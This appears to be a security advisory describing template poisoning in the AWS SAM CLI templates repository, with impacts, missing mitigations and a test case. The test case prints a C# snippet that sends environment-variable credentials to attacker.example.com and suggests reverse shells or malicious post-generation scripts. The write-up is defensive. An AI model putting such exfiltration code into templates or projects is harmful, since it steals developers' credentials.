### Vulnerability Name: Template Poisoning
Description: |
  The AWS SAM CLI Application Templates repository provides templates used by the `sam init` command to create new serverless applications. These templates, written in YAML/JSON and various programming languages, are fetched from this repository when a user initializes a new project using the `sam init` command.

  An attacker could potentially compromise these templates by injecting malicious code. This can be achieved by:
  1. An attacker gains write access to the repository (e.g., through compromised credentials or by exploiting a repository vulnerability if present).
  2. The attacker modifies template files within the repository, injecting malicious code (e.g., shell commands, scripts to exfiltrate credentials).
  3. The attacker pushes these changes to the repository.
  4. A user, unaware of the compromise, uses `sam init` to create a new project, potentially selecting a poisoned template, either directly by specifying the template location or indirectly by using a default template that has been poisoned.
  5. The `sam init` command fetches the compromised template from the repository.
  6. During project initialization, the malicious code embedded in the template is executed in the user's development environment. This could occur during the template rendering phase or during any build scripts included within the template that are executed by `sam init` or subsequent build commands.

Impact: |
  Successful template poisoning can have severe consequences for users initializing projects with compromised templates:
  - Credential Theft: Malicious code can steal AWS credentials or other sensitive information from the user's development environment (e.g., environment variables, AWS configuration files).
  - Remote Code Execution: Attackers can gain arbitrary code execution within the developer's local machine, potentially leading to further system compromise, data breaches, or supply chain attacks.
  - Backdoor Installation: Malicious code can establish backdoors for persistent access to the developer's environment or deployed applications.
  - Data Exfiltration: Sensitive project files or environment information could be exfiltrated to attacker-controlled servers.

Vulnerability Rank: Critical

Currently Implemented Mitigations:
- Currently, there are no specific code-level mitigations implemented within the project itself to prevent template poisoning. The repository relies on GitHub's security features and the security practices of AWS to prevent unauthorized modifications.

Missing Mitigations:
- Code Signing and Verification: Implement a mechanism to sign templates and verify their integrity before `sam init` uses them. This could involve:
    - Digitally signing templates upon release.
    - SAM CLI verifying the signature before using a template.
- Content Security Policy (CSP) for Templates: If templates involve dynamic content rendering, implement CSP to restrict the capabilities of the rendered content and mitigate XSS-like risks.
- Sandboxing or Isolation:  Sandbox the template initialization process to limit the potential damage from malicious code execution. This could involve running template rendering and initial build steps in isolated containers or virtual machines.
- Dependency Checks: Implement checks for dependencies fetched by templates (e.g., npm, pip, maven dependencies) to identify and block known malicious packages.
- Regular Security Audits: Conduct regular security audits of the templates to identify and remove any malicious code that may have been injected.
- User Education: Provide clear warnings and best practices to users about the risks of using templates from untrusted sources and encourage them to review template contents before use.

Preconditions:
- Attacker has write access to the AWS SAM CLI Application Templates repository or a MITM position to inject modified manifest or templates during download.
- User executes `sam init` command and uses a compromised template, either directly or indirectly.
- User development environment is vulnerable to the injected malicious code (e.g., lacks proper security controls, uses vulnerable dependencies).

Source Code Analysis:
- The provided files are primarily README.md files and code examples and tests for various lambda function templates. They do not contain code that directly introduces new vulnerabilities beyond the inherent risk of template poisoning already described. The vulnerability remains in the potential for malicious actors to modify template contents within the repository itself, which is not addressed by the provided application code files. The risk is amplified by the fact that templates can include code in various programming languages and configuration files, allowing for diverse attack vectors within the initialized projects.

Security Test Case:
1. Fork the `aws-sam-cli-app-templates` repository to your own GitHub account.
2. Clone your forked repository locally.
3. Navigate to a template directory (e.g., `dotnet8/hello`).
4. Modify a template file (e.g., `dotnet8/hello/{{cookiecutter.project_name}}/src/HelloWorld/Function.cs`) to include malicious code. For example, add code to exfiltrate AWS credentials to an attacker-controlled server or execute a reverse shell.
   ```csharp
   // Injected malicious code example (for demonstration only, not functional C# exfiltration code):
   string username = Environment.GetEnvironmentVariable("USERNAME");
   string password = Environment.GetEnvironmentVariable("PASSWORD");
   System.Net.WebClient client = new System.Net.WebClient();
   client.DownloadString("http://attacker.example.com/log?user=" + username + "&pass=" + password);
   ```
5. Commit and push your malicious changes to your forked repository.
6. Modify your local SAM CLI configuration to point to your forked repository for template retrieval, as described in the `/code/README.md` file, by updating `samcli/commands/init/init_templates.py` in your local SAM CLI installation to point to your fork and commit hash.
7. Run `sam init --no-input --runtime dotnet8 --app-template hello --name malicious-app` in a test environment.
8. Observe the behavior of the `sam init` command and the created project directory for any signs of malicious activity (e.g., unexpected network connections, unauthorized file modifications, credential access attempts).
9. As an alternative test, create a malicious `post_gen_project.sh` or similar script within a template that executes malicious commands post-generation.
10. Monitor network traffic and system logs during and after `sam init` to detect any malicious activity.

Note: This test case requires careful execution in a controlled, isolated test environment to prevent accidental compromise of sensitive data or systems.
